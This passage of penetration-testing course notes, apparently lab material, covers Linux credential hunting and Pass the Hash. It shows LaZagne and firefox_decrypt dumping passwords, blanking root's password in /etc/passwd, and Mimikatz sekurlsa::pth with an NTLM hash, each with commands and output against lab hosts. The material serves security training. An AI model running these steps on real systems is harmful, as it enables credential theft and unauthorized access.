      &lt;td&gt;Shadow&lt;/td&gt;
      &lt;td&gt;Docker&lt;/td&gt;
      &lt;td&gt;KeePass&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;Mimipy&lt;/td&gt;
      &lt;td&gt;Sessions&lt;/td&gt;
      &lt;td&gt;Keyrings&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;For example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Keyrings&lt;/code&gt; are used for secure storage and management of passwords on Linux distributions. Passwords are stored encrypted and protected with a master password. It is an OS-based password manager, which we will discuss later in another section. This way, we do not need to remember every single password and can save repeated password entries.&lt;/p&gt;

&lt;h4 id=&quot;memory---lazagne&quot;&gt;Memory - LaZagne&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;python2.7 laZagne.py all
&lt;span class=&quot;go&quot;&gt;
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Shadow passwords -----------------

[+] Hash found !!!
Login: systemd-coredump
Hash: !!:18858::::::

[+] Hash found !!!
Login: sambauser
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;Hash: $&lt;/span&gt;6&lt;span class=&quot;nv&quot;&gt;$wgK4tGq7Jepa&lt;/span&gt;.V0g&lt;span class=&quot;nv&quot;&gt;$QkxvseL&lt;/span&gt;.xkC3jo682xhSGoXXOGcBwPLc2CrAPugD6PYXWQlBkiwwFs7x/fhI.8negiUSPqaWyv7wC8uwsWPrx1:18862:0:99999:7:::
&lt;span class=&quot;go&quot;&gt;
[+] Password found !!!
Login: cry0l1t3
Password: WLpAEXFa0SbqOHY


[+] 3 passwords have been found.
For more information launch it again with the -v option

elapsed time = 3.50091600418
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;browsers&quot;&gt;Browsers&lt;/h4&gt;

&lt;p&gt;Browsers store the passwords saved by the user in an encrypted form locally on the system to be reused. For example, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Mozilla Firefox&lt;/code&gt; browser stores the credentials encrypted in a hidden folder for the respective user. These often include the associated field names, URLs, and other valuable information.&lt;/p&gt;

&lt;p&gt;For example, when we store credentials for a web page in the Firefox browser, they are encrypted and stored in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;logins.json&lt;/code&gt; on the system. However, this does not mean that they are safe there. Many employees store such login data in their browser without suspecting that it can easily be decrypted and used against the company.&lt;/p&gt;

&lt;h4 id=&quot;firefox-stored-credentials&quot;&gt;Firefox Stored Credentials&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; .mozilla/firefox/ | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;default 
&lt;span class=&quot;go&quot;&gt;
drwx------ 11 cry0l1t3 cry0l1t3 4096 Jan 28 16:02 1bplpd86.default-release
drwx------  2 cry0l1t3 cry0l1t3 4096 Jan 28 13:30 lfx3lvhb.default
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; .mozilla/firefox/1bplpd86.default-release/logins.json | jq &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;span class=&quot;go&quot;&gt;
{
  &quot;nextId&quot;: 2,
  &quot;logins&quot;: [
    {
      &quot;id&quot;: 1,
      &quot;hostname&quot;: &quot;https://www.inlanefreight.com&quot;,
      &quot;httpRealm&quot;: null,
      &quot;formSubmitURL&quot;: &quot;https://www.inlanefreight.com&quot;,
      &quot;usernameField&quot;: &quot;username&quot;,
      &quot;passwordField&quot;: &quot;password&quot;,
      &quot;encryptedUsername&quot;: &quot;MDoEEPgAAAA...SNIP...1liQiqBBAG/8/UpqwNlEPScm0uecyr&quot;,
      &quot;encryptedPassword&quot;: &quot;MEIEEPgAAAA...SNIP...FrESc4A3OOBBiyS2HR98xsmlrMCRcX2T9Pm14PMp3bpmE=&quot;,
      &quot;guid&quot;: &quot;{412629aa-4113-4ff9-befe-dd9b4ca388e2}&quot;,
      &quot;encType&quot;: 1,
      &quot;timeCreated&quot;: 1643373110869,
      &quot;timeLastUsed&quot;: 1643373110869,
      &quot;timePasswordChanged&quot;: 1643373110869,
      &quot;timesUsed&quot;: 1
    }
  ],
  &quot;potentiallyVulnerablePasswords&quot;: [],
  &quot;dismissedBreachAlertsByLoginGUID&quot;: {},
  &quot;version&quot;: 3
}
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;The tool &lt;a href=&quot;https://github.com/unode/firefox_decrypt&quot;&gt;Firefox Decrypt&lt;/a&gt; is excellent for decrypting these credentials, and is updated regularly. It requires Python 3.9 to run the latest version. Otherwise, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Firefox Decrypt 0.7.0&lt;/code&gt; with Python 2 must be used.&lt;/p&gt;

&lt;h4 id=&quot;decrypting-firefox-credentials&quot;&gt;Decrypting Firefox Credentials&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;c0derpwner@htb[/htb]$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3.9 firefox_decrypt.py
&lt;span class=&quot;go&quot;&gt;
Select the Mozilla profile you wish to decrypt
&lt;/span&gt;&lt;span class=&quot;gp&quot;&gt;1 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;lfx3lvhb.default
&lt;span class=&quot;gp&quot;&gt;2 -&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;1bplpd86.default-release
&lt;span class=&quot;go&quot;&gt;
2

Website:   https://testing.dev.inlanefreight.com
Username: &apos;test&apos;
Password: &apos;test&apos;

Website:   https://www.inlanefreight.com
Username: &apos;cry0l1t3&apos;
Password: &apos;FzXUxJemKm6g2lGh&apos;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Alternatively, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;LaZagne&lt;/code&gt; can also return results if the user has used the supported browser.&lt;/p&gt;

&lt;h4 id=&quot;browsers---lazagne&quot;&gt;Browsers - LaZagne&lt;/h4&gt;

&lt;p&gt;Credential Hunting in Linux&lt;/p&gt;

&lt;div class=&quot;language-shell-session highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;gp&quot;&gt;cry0l1t3@unixclient:~$&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;python3 laZagne.py browsers
&lt;span class=&quot;go&quot;&gt;
|====================================================================|
|                                                                    |
|                        The LaZagne Project                         |
|                                                                    |
|                          ! BANG BANG !                             |
|                                                                    |
|====================================================================|

------------------- Firefox passwords -----------------

[+] Password found !!!
URL: https://testing.dev.inlanefreight.com
Login: test
Password: test

[+] Password found !!!
URL: https://www.inlanefreight.com
Login: cry0l1t3
Password: FzXUxJemKm6g2lGh


[+] 2 passwords have been found.
For more information launch it again with the -v option

elapsed time = 0.2310788631439209
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;hr /&gt;

&lt;h4 id=&quot;passwd-shadow--opasswd&quot;&gt;Passwd, Shadow &amp;amp; Opasswd&lt;/h4&gt;

&lt;p&gt;Linux-based distributions can use many different authentication mechanisms. One of the most commonly used and standard mechanisms is &lt;a href=&quot;https://web.archive.org/web/20220622215926/http://www.linux-pam.org/Linux-PAM-html/Linux-PAM_SAG.html&quot;&gt;Pluggable Authentication Modules&lt;/a&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAM&lt;/code&gt;). The modules used for this are called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pam_unix.so&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pam_unix2.so&lt;/code&gt; and are located in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/usr/lib/x86_x64-linux-gnu/security/&lt;/code&gt; in Debian based distributions. These modules manage user information, authentication, sessions, current passwords, and old passwords. For example, if we want to change the password of our account on the Linux system with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;passwd&lt;/code&gt;, PAM is called, which takes the appropriate precautions and stores and handles the information accordingly.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;pam_unix.so&lt;/code&gt; standard module for management uses standardized API calls from the system libraries and files to update the account information. The standard files that are read, managed, and updated are &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt;. PAM also has many other service modules, such as LDAP, mount, or Kerberos.&lt;/p&gt;

&lt;h5 id=&quot;passwd&quot;&gt;PASSWD&lt;/h5&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file contains information about every existing user on the system and can be read by all users and services. Each entry in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; file identifies a user on the system. Each entry has seven fields containing a form of a database with information about the particular user, where a colon (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:&lt;/code&gt;) separates the information. Accordingly, such an entry may look something like this:&lt;/p&gt;

&lt;h4 id=&quot;passwd-format&quot;&gt;Passwd Format&lt;/h4&gt;

&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cry0l1t3&lt;/code&gt;&lt;/th&gt;
      &lt;th&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:&lt;/code&gt;&lt;/th&gt;
      &lt;th&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x&lt;/code&gt;&lt;/th&gt;
      &lt;th&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:&lt;/code&gt;&lt;/th&gt;
      &lt;th&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1000&lt;/code&gt;&lt;/th&gt;
      &lt;th&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:&lt;/code&gt;&lt;/th&gt;
      &lt;th&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;1000&lt;/code&gt;&lt;/th&gt;
      &lt;th&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:&lt;/code&gt;&lt;/th&gt;
      &lt;th&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cry0l1t3,,,&lt;/code&gt;&lt;/th&gt;
      &lt;th&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:&lt;/code&gt;&lt;/th&gt;
      &lt;th&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/home/cry0l1t3&lt;/code&gt;&lt;/th&gt;
      &lt;th&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;:&lt;/code&gt;&lt;/th&gt;
      &lt;th&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/bin/bash&lt;/code&gt;&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;Login name&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;Password info&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;UID&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;GUID&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;Full name/comments&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;Home directory&lt;/td&gt;
      &lt;td&gt; &lt;/td&gt;
      &lt;td&gt;Shell&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;p&gt;The most interesting field for us is the Password information field in this section because there can be different entries here. One of the rarest cases that we may find only on very old systems is the hash of the encrypted password in this field. Modern systems have the hash values stored in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; file, which we will come back to later. Nevertheless, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; is readable system-wide, giving attackers the possibility to crack the passwords if hashes are stored here.&lt;/p&gt;

&lt;h4 id=&quot;editing-etcpasswd---before&quot;&gt;Editing /etc/passwd - Before&lt;/h4&gt;

&lt;p&gt;Passwd, Shadow &amp;amp; Opasswd&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root:x:0:0:root:/root:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;editing-etcpasswd---after&quot;&gt;Editing /etc/passwd - After&lt;/h4&gt;

&lt;p&gt;Passwd, Shadow &amp;amp; Opasswd&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;root::0:0:root:/root:/bin/bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;root-without-password&quot;&gt;Root without Password&lt;/h4&gt;

&lt;p&gt;Passwd, Shadow &amp;amp; Opasswd&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;cry0l1t3@parrot]─[~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;head&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1 /etc/passwd

root::0:0:root:/root:/bin/bash


&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;cry0l1t3@parrot]─[~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;root@parrot]─[/home/cry0l1t3]#
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h2 id=&quot;shadow-file&quot;&gt;Shadow File&lt;/h2&gt;

&lt;p&gt;Since reading the password hash values can put the entire system in danger, the file &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; was developed, which has a similar format to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt; but is only responsible for passwords and their management. It contains all the password information for the created users. For example, if there is no entry in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; file for a user in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/passwd&lt;/code&gt;, the user is considered invalid. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/etc/shadow&lt;/code&gt; file is also only readable by users who have administrator rights. The format of this file is divided into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nine fields&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;If the password field contains a character, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;!&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;*&lt;/code&gt;, the user cannot log in with a Unix password. However, other authentication methods for logging in, such as Kerberos or key-based authentication, can still be used. The same case applies if the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;encrypted password&lt;/code&gt; field is empty. This means that no password is required for the login. However, it can lead to specific programs denying access to functions. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;encrypted password&lt;/code&gt; also has a particular format by which we can also find out some information:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$&amp;lt;type&amp;gt;$&amp;lt;salt&amp;gt;$&amp;lt;hashed&amp;gt;&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As we can see here, the encrypted passwords are divided into three parts. The types of encryption allow us to distinguish between the following:&lt;/p&gt;

&lt;h4 id=&quot;algorithm-types&quot;&gt;Algorithm Types&lt;/h4&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$1$&lt;/code&gt; – MD5&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$2a$&lt;/code&gt; – Blowfish&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$2y$&lt;/code&gt; – Eksblowfish&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$5$&lt;/code&gt; – SHA-256&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$6$&lt;/code&gt; – SHA-512&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;By default, the SHA-512 (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;$6$&lt;/code&gt;) encryption method is used on the latest Linux distributions. We will also find the other encryption methods that we can then try to crack on older systems. We will discuss how the cracking works in a bit.&lt;/p&gt;

&lt;hr /&gt;

&lt;h1 id=&quot;pass-the-hash-pth&quot;&gt;Pass the Hash (PtH)&lt;/h1&gt;

&lt;p&gt;A &lt;a href=&quot;https://attack.mitre.org/techniques/T1550/002/&quot;&gt;Pass the Hash (PtH)&lt;/a&gt; attack is a technique where an attacker uses a password hash instead of the plain text password for authentication. The attacker doesn’t need to decrypt the hash to obtain a plaintext password. PtH attacks exploit the authentication protocol, as the password hash remains static for every session until the password is changed.&lt;/p&gt;

&lt;p&gt;As discussed in the previous sections, the attacker must have administrative privileges or particular privileges on the target machine to obtain a password hash. Hashes can be obtained in several ways, including:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Dumping the local SAM database from a compromised host.&lt;/li&gt;
  &lt;li&gt;Extracting hashes from the NTDS database (ntds.dit) on a Domain Controller.&lt;/li&gt;
  &lt;li&gt;Pulling the hashes from memory (lsass.exe).&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Let’s assume we obtain the password hash (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64F12CDDAA88057E06A81B54E73B949B&lt;/code&gt;) for the account &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;julio&lt;/code&gt; from the domain &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;inlanefreight.htb&lt;/code&gt;. Let’s see how we can perform Pass the Hash attacks from Windows and Linux machines.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Note:&lt;/strong&gt; The tools we will be using are located in the C:\tools directory on the target host. Once you start the machine and complete the exercises, you can use the tools in that directory. This lab contains two machines, you will have access to one (MS01), and from there, you will connect to the second machine (DC01).&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;windows-ntlm-introduction&quot;&gt;Windows NTLM Introduction&lt;/h2&gt;

&lt;p&gt;Microsoft’s &lt;a href=&quot;https://learn.microsoft.com/en-us/windows-server/security/kerberos/ntlm-overview&quot;&gt;Windows New Technology LAN Manager (NTLM)&lt;/a&gt; is a set of security protocols that authenticates users’ identities while also protecting the integrity and confidentiality of their data. NTLM is a single sign-on (SSO) solution that uses a challenge-response protocol to verify the user’s identity without having them provide a password.&lt;/p&gt;

&lt;p&gt;Despite its known flaws, NTLM is still commonly used to ensure compatibility with legacy clients and servers, even on modern systems. While Microsoft continues to support NTLM, Kerberos has taken over as the default authentication mechanism in Windows 2000 and subsequent Active Directory (AD) domains.&lt;/p&gt;

&lt;p&gt;With NTLM, passwords stored on the server and domain controller are not “salted,” which means that an adversary with a password hash can authenticate a session without knowing the original password. We call this a &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Pass the Hash (PtH) Attack&lt;/code&gt;.&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;pass-the-hash-with-mimikatz-windows&quot;&gt;Pass the Hash with Mimikatz (Windows)&lt;/h2&gt;

&lt;p&gt;The first tool we will use to perform a Pass the Hash attack is &lt;a href=&quot;https://github.com/gentilkiwi&quot;&gt;Mimikatz&lt;/a&gt;. Mimikatz has a module named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sekurlsa::pth&lt;/code&gt; that allows us to perform a Pass the Hash attack by starting a process using the hash of the user’s password. To use this module, we will need the following:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/user&lt;/code&gt; - The user name we want to impersonate.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/rc4&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/NTLM&lt;/code&gt; - NTLM hash of the user’s password.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/domain&lt;/code&gt; - Domain the user to impersonate belongs to. In the case of a local user account, we can use the computer name, localhost, or a dot (.).&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/run&lt;/code&gt; - The program we want to run with the user’s context (if not specified, it will launch cmd.exe).&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;pass-the-hash-from-windows-using-mimikatz&quot;&gt;Pass the Hash from Windows Using Mimikatz:&lt;/h4&gt;

&lt;p&gt;Pass the Hash (PtH)&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-cmd-session&quot;&gt;c:\tools&amp;gt; mimikatz.exe privilege::debug &quot;sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe&quot; exit
user    : julio
domain  : inlanefreight.htb
program : cmd.exe
impers. : no
NTLM    : 64F12CDDAA88057E06A81B54E73B949B
  |  PID  8404
  |  TID  4268
  |  LSA Process was already R/W
  |  LUID 0 ; 5218172 (00000000:004f9f7c)
  \_ msv1_0   - data copy @ 0000028FC91AB510 : OK !
  \_ kerberos - data copy @ 0000028FC964F288
   \_ des_cbc_md4       -&amp;gt; null
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ des_cbc_md4       OK
   \_ *Password replace @ 0000028FC9673AE8 (32) -&amp;gt; null
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now we can use cmd.exe to execute commands in the user’s context. For this example, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;julio&lt;/code&gt; can connect to a shared folder named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;julio&lt;/code&gt; on the DC.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://academy.hackthebox.com/storage/modules/147/pth_julio.jpg&quot; alt=&quot;Command prompt showing mimikatz execution with privilege escalation and directory listing commands.&quot; /&gt;&lt;/p&gt;

&lt;hr /&gt;

&lt;h2 id=&quot;pass-the-hash-with-powershell-invoke-thehash-windows&quot;&gt;Pass the Hash with PowerShell Invoke-TheHash (Windows)&lt;/h2&gt;

&lt;p&gt;Another tool we can use to perform Pass the Hash attacks on Windows is &lt;a href=&quot;https://github.com/Kevin-Robertson/Invoke-TheHash&quot;&gt;Invoke-TheHash&lt;/a&gt;. This tool is a collection of PowerShell functions for performing Pass the Hash attacks with WMI and SMB. WMI and SMB connections are accessed through the .NET TCPClient. Authentication is performed by passing an NTLM hash into the NTLMv2 authentication protocol. Local administrator privileges are not required client-side, but the user and hash we use to authenticate need to have administrative rights on the target computer. For this example we will use the user &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;julio&lt;/code&gt; and the hash &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;64F12CDDAA88057E06A81B54E73B949B&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;When using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Invoke-TheHash&lt;/code&gt;, we have two options: SMB or WMI command execution. To use this tool, we need to specify the following parameters to execute commands in the target computer:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Target&lt;/code&gt; - Hostname or IP address of the target.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Username&lt;/code&gt; - Username to use for authentication.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Domain&lt;/code&gt; - Domain to use for authentication. This parameter is unnecessary with local accounts or when using the @domain after the username.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Hash&lt;/code&gt; - NTLM password hash for authentication. This function will accept either LM:NTLM or NTLM format.&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Command&lt;/code&gt; - Command to execute on the target. If a command is not specified, the function will check to see if the username and hash have access to WMI on the target.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The following command will use the SMB method for command execution to create a new user named mark and add the user to the Administrators group.&lt;/p&gt;

&lt;h4 id=&quot;invoke-thehash-with-smb&quot;&gt;Invoke-TheHash with SMB&lt;/h4&gt;

&lt;p&gt;Pass the Hash (PtH)&lt;/p&gt;

&lt;div class=&quot;language-powershell highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c:\htb&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;cd&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;C:\tools\Invoke-TheHash\&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PS&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;c:\tools\Invoke-TheHash&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Import-Module&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;\Invoke-TheHash.psd1&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
